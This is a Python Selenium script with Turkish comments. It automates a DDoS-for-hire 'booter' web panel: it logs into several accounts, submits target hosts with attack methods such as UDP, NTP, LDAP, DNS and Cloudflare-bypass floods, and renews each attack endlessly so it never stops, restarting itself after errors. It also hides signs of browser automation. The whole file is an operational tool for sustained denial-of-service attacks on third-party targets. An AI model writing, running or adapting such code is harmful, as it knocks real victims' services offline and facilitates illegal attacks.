import os
import time
import threading
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# ------------------------------
# SABİT AYARLAR
# ------------------------------
BASE_URL = "https://hardstress.st"
LOGIN_URL = f"{BASE_URL}/panel/login.php"
BOOTER_URL = f"{BASE_URL}/panel/booter.php"

METHODS = [
    "UDP", "LDAP", "ARD", "VOX", "STUN", "VSE", "ACK", "IPX", "KGB",
    "PROWIN", "DNS", "NTP", "TCP", "WIZARD", "XSYN", "ZAP", "ZSYN",
    "CLOUDFLARE", "RAW", "HEAVYJES", "REQUESTS", "HTTP", "HTTPS",
    "CAPTCHA-BYPASS", "CFBYPASSV2", "SOCKET", "TLS", "CLOUDFLARE-UAM"
]

PORT = 80
DURATION = 60  # saniye

# Aynı anda kaç thread çalışsın (Railway ücretsizde 2 ideal)
MAX_CONCURRENT_THREADS = 2

# ------------------------------
# TARAYICI KURULUMU (Railway uyumlu + kararlı)
# ------------------------------
def create_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-software-rasterizer")
    chrome_options.add_argument("--disable-setuid-sandbox")
    chrome_options.add_argument("--single-process")  # bellek tasarrufu
    chrome_options.add_argument("--memory-pressure-off")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--remote-debugging-port=9222")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)

    # Railway'de Chromium yolu
    chromedriver_path = os.getenv("CHROMEDRIVER_BIN", "/usr/bin/chromedriver")
    chrome_binary = os.getenv("CHROME_BIN", "/usr/bin/chromium")

    if os.path.exists(chrome_binary):
        chrome_options.binary_location = chrome_binary

    if os.path.exists(chromedriver_path):
        service = Service(executable_path=chromedriver_path)
        driver = webdriver.Chrome(service=service, options=chrome_options)
    else:
        # Yedek: webdriver-manager (yerel test için)
        from webdriver_manager.chrome import ChromeDriverManager
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)

    driver.set_page_load_timeout(60)
    driver.implicitly_wait(10)
    return driver

# ------------------------------
# "Okay" MODALINI KAPAT
# ------------------------------
def click_okay_modal(driver):
    try:
        okay_btn = WebDriverWait(driver, 20).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "a.btn.target.close.sf"))
        )
        okay_btn.click()
        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        time.sleep(2)
    except TimeoutException:
        pass

# ------------------------------
# HER HESAP İÇİN ANA SALDIRI DÖNGÜSÜ (KENDİNİ ONARIR)
# ------------------------------
def attack_loop(username, password, target_host, method):
    while True:
        driver = None
        try:
            driver = create_driver()
            print(f"[{username}] Giriş yapılıyor...")
            driver.get(LOGIN_URL)
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.NAME, "kullaniciadi")))
            driver.find_element(By.NAME, "kullaniciadi").send_keys(username)
            driver.find_element(By.NAME, "sifreniz").send_keys(password)
            driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
            WebDriverWait(driver, 30).until(EC.url_contains("/panel/"))
            print(f"[{username}] Giriş başarılı.")

            driver.get(BOOTER_URL)
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "host")))

            # Parametreleri doldur
            driver.find_element(By.ID, "host").clear()
            driver.find_element(By.ID, "host").send_keys(target_host)
            driver.find_element(By.ID, "port").clear()
            driver.find_element(By.ID, "port").send_keys(str(PORT))
            driver.find_element(By.ID, "time").clear()
            driver.find_element(By.ID, "time").send_keys(str(DURATION))

            method_select = driver.find_element(By.ID, "method")
            for option in method_select.find_elements(By.TAG_NAME, "option"):
                if option.get_attribute("value") == method:
                    option.click()
                    break

            # İlk saldırıyı başlat
            print(f"[{username}] {target_host} hedefine {method} ile saldırı başlatılıyor...")
            start_btn = driver.find_element(By.ID, "attack31")
            start_btn.click()
            click_okay_modal(driver)
            print(f"[{username}] İlk saldırı başlatıldı.")

            # Sonsuz yenileme döngüsü
            while True:
                row_xpath = f"//td[contains(text(),'{target_host}')]/parent::tr"
                try:
                    row = WebDriverWait(driver, 30).until(
                        EC.presence_of_element_located((By.XPATH, row_xpath))
                    )
                except TimeoutException:
                    print(f"[{username}] Tablo satırı bulunamadı, sayfa yenileniyor...")
                    driver.refresh()
                    time.sleep(5)
                    continue

                status_cell = row.find_elements(By.TAG_NAME, "td")[4]
                status_text = status_cell.text.strip()
                print(f"[{username}] Mevcut durum: {status_text}")

                if status_text.isdigit():
                    print(f"[{username}] Saldırı devam ediyor ({status_text}s kaldı)...")
                    while True:
                        time.sleep(2)
                        row = driver.find_element(By.XPATH, row_xpath)
                        status_cell = row.find_elements(By.TAG_NAME, "td")[4]
                        new_status = status_cell.text.strip()
                        if new_status == "Expired" or not new_status.isdigit():
                            print(f"[{username}] Saldırı süresi doldu.")
                            break
                        if new_status.isdigit():
                            print(f"[{username}] {new_status}s")

                # Yenile butonuna tıkla
                try:
                    renew_btn = row.find_element(By.CSS_SELECTOR, "#rere")
                    print(f"[{username}] Yenile butonuna tıklanıyor...")
                    renew_btn.click()
                    click_okay_modal(driver)
                    print(f"[{username}] Saldırı yenilendi.")
                except NoSuchElementException:
                    print(f"[{username}] Yenile butonu bulunamadı, bekleniyor...")
                    time.sleep(5)
                    continue

                time.sleep(1)

        except Exception as e:
            print(f"[{username}] KRİTİK HATA: {e}")
            if driver:
                try:
                    driver.quit()
                except:
                    pass
            print(f"[{username}] 15 saniye beklenip yeniden başlatılacak...")
            time.sleep(15)
            continue

# ------------------------------
# HESAPLARI OKU VE THREAD'LARI BAŞLAT (SINIRLI SAYIDA)
# ------------------------------
def main():
    lines = []
    try:
        with open("accounts.txt", "r") as f:
            lines = [line.strip() for line in f if line.strip()]
        print("accounts.txt dosyası okundu.")
    except FileNotFoundError:
        env_accounts = os.getenv("ACCOUNTS")
        if env_accounts:
            lines = [line.strip() for line in env_accounts.splitlines() if line.strip()]
            print("ACCOUNTS ortam değişkeni okundu.")
        else:
            print("[!] Hata: accounts.txt veya ACCOUNTS env değişkeni bulunamadı.")
            return

    accounts = []
    for line in lines:
        parts = line.split(":")
        if len(parts) >= 3:
            user, passw, link = parts[0], parts[1], parts[2]
            accounts.append((user, passw, link))
        else:
            print(f"[!] Geçersiz satır atlanıyor: {line}")

    if not accounts:
        print("[!] Geçerli hesap bulunamadı.")
        return

    # Thread havuzu – sadece MAX_CONCURRENT_THREADS kadar aktif thread
    semaphore = threading.Semaphore(MAX_CONCURRENT_THREADS)

    def thread_wrapper(user, passw, link, method):
        with semaphore:
            attack_loop(user, passw, link, method)

    threads = []
    for idx, (user, passw, link) in enumerate(accounts):
        method = METHODS[idx % len(METHODS)]
        print(f"Thread başlatılıyor: {user} -> Hedef: {link}, Method: {method}")
        t = threading.Thread(target=thread_wrapper, args=(user, passw, link, method), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(10)  # Her thread arasında 10 saniye bekle (kaynak kullanımını azaltır)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
